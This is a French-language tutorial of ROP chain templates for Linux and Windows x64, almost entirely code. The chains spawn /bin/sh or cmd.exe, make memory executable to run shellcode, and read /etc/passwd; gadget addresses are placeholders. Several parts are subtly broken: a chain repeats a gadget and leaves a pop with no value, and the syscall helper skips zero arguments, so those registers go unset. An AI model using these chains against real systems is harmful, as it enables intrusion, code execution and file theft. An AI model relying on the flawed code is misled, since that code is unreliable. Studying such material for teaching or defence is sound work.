# Templates ROP - Guide Théorique

## 📋 Vue d'Ensemble

Ce document fournit des templates théoriques pour construire des chaînes ROP (Return-Oriented Programming) sur différentes architectures.

## ⚠️ Avertissement

Ces templates sont **purement théoriques** et destinés à la recherche et à l'éducation. Ils ne doivent pas être utilisés pour exploiter des systèmes sans autorisation.

## 🏗️ Structure d'une Chaîne ROP

### Composants de Base

1. **Gadgets** : Séquences d'instructions existantes
2. **Chaînage** : Connexion des gadgets via `ret`
3. **Préparation des registres** : Setup pour appels système/fonctions
4. **Appels système** : Exécution de code via syscalls

## 📐 Templates Linux x64

### Template 1 : Appel Système Simple (execve)

```python
# Structure mémoire
rop_chain = [
    # Préparer les arguments
    pop_rdi_gadget,      # pop rdi; ret
    binsh_addr,          # "/bin/sh" string address
    
    pop_rsi_gadget,      # pop rsi; ret
    argv_addr,           # argv = ["/bin/sh", NULL]
    
    pop_rdx_gadget,      # pop rdx; ret
    envp_addr,           # envp = NULL
    
    pop_rax_gadget,      # pop rax; ret
    59,                  # syscall number (execve)
    
    syscall_gadget,      # syscall; ret
]
```

### Template 2 : mprotect() + Shellcode

```python
# Rendre la stack exécutable puis exécuter shellcode
rop_chain = [
    # Appel mprotect(stack_addr, size, PROT_EXEC)
    pop_rdi_gadget,      # pop rdi; ret
    stack_addr,          # Adresse de la stack
    
    pop_rsi_gadget,      # pop rsi; ret
    0x1000,              # Taille (4096 bytes)
    
    pop_rdx_gadget,      # pop rdx; ret
    7,                   # PROT_READ | PROT_WRITE | PROT_EXEC
    
    pop_rax_gadget,      # pop rax; ret
    10,                  # syscall number (mprotect)
    
    syscall_gadget,      # syscall; ret
    
    # Retourner vers le shellcode
    shellcode_addr,      # Adresse du shellcode sur la stack
]
```

### Template 3 : Retour vers Fonction (ret2libc)

```python
# Appeler system("/bin/sh")
rop_chain = [
    pop_rdi_gadget,      # pop rdi; ret
    binsh_addr,          # "/bin/sh" string
    
    system_addr,         # Adresse de system()
    
    # Optionnel : exit() pour propre sortie
    pop_rdi_gadget,      # pop rdi; ret
    0,                   # Code de sortie
    
    exit_addr,           # Adresse de exit()
]
```

## 📐 Templates Windows x64

### Template 1 : VirtualProtect() + Shellcode

```python
# Rendre la mémoire exécutable (Windows)
rop_chain = [
    # VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)
    pop_rcx_gadget,      # pop rcx; ret
    shellcode_addr,      # lpAddress
    
    pop_rdx_gadget,      # pop rdx; ret
    0x1000,              # dwSize
    
    pop_r8_gadget,       # pop r8; ret
    0x40,                # PAGE_EXECUTE_READWRITE
    
    pop_r9_gadget,       # pop r9; ret
    old_protect_addr,    # lpflOldProtect (adresse pour stocker)
    
    VirtualProtect_addr, # Adresse de VirtualProtect()
    
    # Retourner vers le shellcode
    shellcode_addr,
]
```

### Template 2 : WinExec() (Simple)

```python
# Exécuter une commande via WinExec()
rop_chain = [
    pop_rcx_gadget,      # pop rcx; ret
    cmd_addr,            # "cmd.exe" string
    
    pop_rdx_gadget,      # pop rdx; ret
    1,                   # nShowCmd (SW_SHOWNORMAL)
    
    WinExec_addr,        # Adresse de WinExec()
]
```

## 🔧 Techniques Avancées

### Chaînage Complexe

```python
# Exemple : Chaîne avec plusieurs appels
rop_chain = [
    # Appel 1 : open("/etc/passwd")
    pop_rdi_gadget,
    passwd_str_addr,
    pop_rsi_gadget,
    0,  # O_RDONLY
    pop_rdx_gadget,
    0,  # mode
    pop_rax_gadget,
    2,  # syscall open
    syscall_gadget,
    
    # Sauvegarder le file descriptor
    pop_rbx_gadget,      # pop rbx; ret
    pop_rbx_gadget,      # Sauvegarder rax dans rbx
    mov_rbx_rax_gadget,  # mov rbx, rax; ret
    
    # Appel 2 : read(fd, buffer, size)
    pop_rdi_gadget,
    # Utiliser rbx (file descriptor)
    mov_rdi_rbx_gadget,  # mov rdi, rbx; ret
    pop_rsi_gadget,
    buffer_addr,
    pop_rdx_gadget,
    1024,
    pop_rax_gadget,
    0,  # syscall read
    syscall_gadget,
]
```

### Gestion des Appels Système

```python
# Template générique pour syscall Linux x64
def build_syscall(syscall_num, rdi=0, rsi=0, rdx=0, r10=0, r8=0, r9=0):
    chain = []
    
    if rdi != 0:
        chain.extend([pop_rdi_gadget, rdi])
    if rsi != 0:
        chain.extend([pop_rsi_gadget, rsi])
    if rdx != 0:
        chain.extend([pop_rdx_gadget, rdx])
    if r10 != 0:
        chain.extend([pop_r10_gadget, r10])
    if r8 != 0:
        chain.extend([pop_r8_gadget, r8])
    if r9 != 0:
        chain.extend([pop_r9_gadget, r9])
    
    chain.extend([pop_rax_gadget, syscall_num, syscall_gadget])
    return chain
```

## 🎯 Recherche de Gadgets

### Outils

- **ROPgadget** : `ROPgadget --binary binary`
- **ropper** : `ropper -f binary --search "pop rdi"`
- **objdump** : `objdump -d binary | grep -E "pop|ret"`

### Gadgets Utiles

```python
# Gadgets de base Linux x64
POP_RDI_RET = 0x...  # pop rdi; ret
POP_RSI_RET = 0x...  # pop rsi; ret
POP_RDX_RET = 0x...  # pop rdx; ret
POP_RAX_RET = 0x...  # pop rax; ret
SYSCALL_RET = 0x...  # syscall; ret

# Gadgets avancés
POP_RDI_POP_RSI_RET = 0x...  # pop rdi; pop rsi; ret
MOV_RDI_RSI_RET = 0x...      # mov rdi, rsi; ret
XOR_RAX_RAX_RET = 0x...      # xor rax, rax; ret
```

## 📚 Références

- [ROP: Return-Oriented Programming](https://hovav.net/ucsd/talks/blackhat08.html)
- [ROPgadget Tool](https://github.com/JonathanSalwan/ROPgadget)
- [x64 Calling Convention](https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention)

## 🎓 Points Clés

1. **ROP est Turing-complete** : Peut faire tout ce qu'un shellcode peut faire
2. **Gadgets réutilisables** : Même gadgets pour différents exploits
3. **Architecture-spécifique** : Templates différents pour x86, x64, ARM
4. **Complexité** : Nécessite une bonne compréhension de l'architecture

---

**Note** : Ces templates sont théoriques. Adapter selon le contexte spécifique de l'exploitation.

